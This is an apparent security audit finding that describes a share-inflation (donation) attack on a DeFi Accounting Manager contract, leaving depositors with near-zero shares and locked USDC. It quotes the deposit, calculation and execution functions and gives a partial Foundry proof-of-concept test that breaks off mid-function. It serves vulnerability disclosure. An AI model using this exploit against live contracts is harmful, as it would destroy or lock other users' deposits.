# Vulnerability details

## Impact
An attacker can render user deposits to result in fewer shares minted to honest depositors by making a direct asset (USDC) transfer into the Accounting Manager contract before the first deposit batch is calculated and then minted. Impacted users will not be able to withdraw their assets and in most cases will get near 0 shares irrespective of how many assets they deposited (e.g 10000+) after the attack

## Proof of Concept
The functions below facilitate a user deposit, protocol deposit queue share calculation, and execution at which point the users receive their shares minted to them.

Deposit and get added to the queue:
```solidity
function deposit(address receiver, uint256 amount, address referrer) public nonReentrant whenNotPaused {
        if (amount == 0) {
            revert NoyaAccounting_INVALID_AMOUNT();
        }

        baseToken.safeTransferFrom(msg.sender, address(this), amount);

        if (amount > depositLimitPerTransaction) {
            revert NoyaAccounting_DepositLimitPerTransactionExceeded();
        }

        if (TVL() > depositLimitTotalAmount) {
            revert NoyaAccounting_TotalDepositLimitExceeded();
        }

        depositQueue.queue[depositQueue.last] = DepositRequest(receiver, block.timestamp, 0, amount, 0);
        emit RecordDeposit(depositQueue.last, receiver, block.timestamp, amount, referrer);
        depositQueue.last += 1;
        depositQueue.totalAWFDeposit += amount;
    }
```

The manager then calculates how many shares to mint for all depositors in the current deposit queue:
```solidity
function calculateDepositShares(uint256 maxIterations) public onlyManager nonReentrant whenNotPaused {
        uint256 middleTemp = depositQueue.middle;
        uint64 i = 0;

        uint256 oldestUpdateTime = TVLHelper.getLatestUpdateTime(vaultId, registry);

        while (
            depositQueue.last > middleTemp && depositQueue.queue[middleTemp].recordTime <= oldestUpdateTime
                && i < maxIterations
        ) {
            i += 1;
            DepositRequest storage data = depositQueue.queue[middleTemp];

            uint256 shares = previewDeposit(data.amount);
            data.shares = shares;
            data.calculationTime = block.timestamp;
            emit CalculateDeposit(
                middleTemp, data.receiver, block.timestamp, shares, data.amount, shares * 1e18 / data.amount
            );

            middleTemp += 1;
        }

        depositQueue.middle = middleTemp;
    }
```

The manager then executes the deposits in the queue, at which point users get minted shares in the `_mint` logic:
```solidity
function executeDeposit(uint256 maxI, address connector, bytes memory addLPdata)
        public
        onlyManager
        whenNotPaused
        nonReentrant
    {
        uint256 firstTemp = depositQueue.first;
        uint64 i = 0;
        uint256 processedBaseTokenAmount = 0;

        while (
            depositQueue.middle > firstTemp
                && depositQueue.queue[firstTemp].calculationTime + depositWaitingTime <= block.timestamp && i < maxI
        ) {
            i += 1;
            DepositRequest memory data = depositQueue.queue[firstTemp];

            emit ExecuteDeposit(
                firstTemp, data.receiver, block.timestamp, data.shares, data.amount, data.shares * 1e18 / data.amount
            );
            // minting shares for receiver address
            _mint(data.receiver, data.shares);

            processedBaseTokenAmount += data.amount;
            delete depositQueue.queue[firstTemp];
            firstTemp += 1;
        }
        depositQueue.totalAWFDeposit -= processedBaseTokenAmount;

        totalDepositedAmount += processedBaseTokenAmount;

        if (registry.isAnActiveConnector(vaultId, connector) && processedBaseTokenAmount > 0) {
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = processedBaseTokenAmount;
            address[] memory tokens = new address[](1);
            tokens[0] = address(baseToken);
            IConnector(connector).addLiquidity(tokens, amounts, addLPdata);
        } else {
            revert NoyaAccounting_INVALID_CONNECTOR();
        }

        depositQueue.first = firstTemp;
    }
```

Now, following the assumption that everything happens in that order above from 1-3, shares distortion will not happen and the issue will not occur. But, imagine the scenario where the Accounting Manager has 1000 USDC and 0 `shares` and 0 `totalSupply`. The shares ratio then gets distorted presenting the issue from the very first deposit execution.

- Alice notices the protocol has a batch of incoming deposits waiting to be calculated and executed (each deposit stream is executed after a 30-minute delay), let's say 1000 USDC total in the batch
- Alice makes a direct USDC transfer to the Accounting Manager contract, e.g transferring 1000 USDC
- Users 1, 2, 3, 4, and 5 all have 200 USDC deposited hence making up the 1000 USDC in the deposit queue
- Manager calculates the shares to mint to users 1-5 (it should be 200 shares each)
- The manager executes the deposit batch (at this point the USDC is transferred from the accounting manager to the respective vault connected to it) but the amount minted to all users is near zero because of Alice's transfer of 1000 USDC + the new 1000 USDC that now exists in the connector vault tied to accounting manager + the overly distorted `totalSupply` of shares
- Users 1, 2, 3, 4, & 5 attempt to make withdrawals in the future but they have near zero shares and cannot withdraw anything since the `withdraw()` calls revert right away due to near zero shares for the amount of USDC requested. As a result of this, the 1000 USDC deposited in the connector vault cannot be pulled because the users need to be the ones initiating a successful withdrawal before such assets are pulled.
- A lot of USDC tokens are then locked in the Accounting Manager contract + the USDC deposited into the connector vault cannot be retrieved

Paste the test below into the `TestAccounting.sol` file and run with `forge test --mt testAttackShares -vvv`

```solidity
function testAttackShares() public {
        console.log("-----------Base Workflow--------------");
        uint256 _amount = 2_000 * 1e6;

        address george = makeAddr("george");

        _dealWhale(baseToken, address(alice), address(0x1AB4973a48dc892Cd9971ECE8e01DcC7688f8F23), _amount);
        _dealWhale(baseToken, address(bob), address(0x1AB4973a48dc892Cd9971ECE8e01DcC7688f8F23), _amount);
        _dealWhale(baseToken, address(george), address(0x1AB4973a48dc892Cd9971ECE8e01DcC7688f8F23), 4 * _amount);

        vm.startPrank(alice);
        IERC20(baseToken).transfer(address(accountingManager), _amount);
        console.log("Balance of AccountingManager after Alice transfer to sabotage: %s USDC", IERC20(USDC).balanceOf(address(accountingManager)) / 1e6);
        vm.stopPrank();

        vm.startPrank(bob);
        SafeERC20.forceApprove(IERC20(USDC), address(accountingManager), _amount);
        accountingManager.deposit(address(bob), _amount, address(0));
        vm.stopPrank();

        vm.startPrank(george);
        SafeERC20.forceApprove(IERC20(USDC), address(accountingManager), 4 * _amount);
        accountingManager.deposit(address(george), 4 * _amount, address(0));
        vm.stopPrank();

        console.log("Balance of AccountingManager after Bob & George deposit: %s USDC", IERC20(USDC).balanceOf(address(accountingManager)) / 1e6);

        uint256[] memory arr = new uint256[](2);
        arr[0] = 0;
        arr[1] = 1;
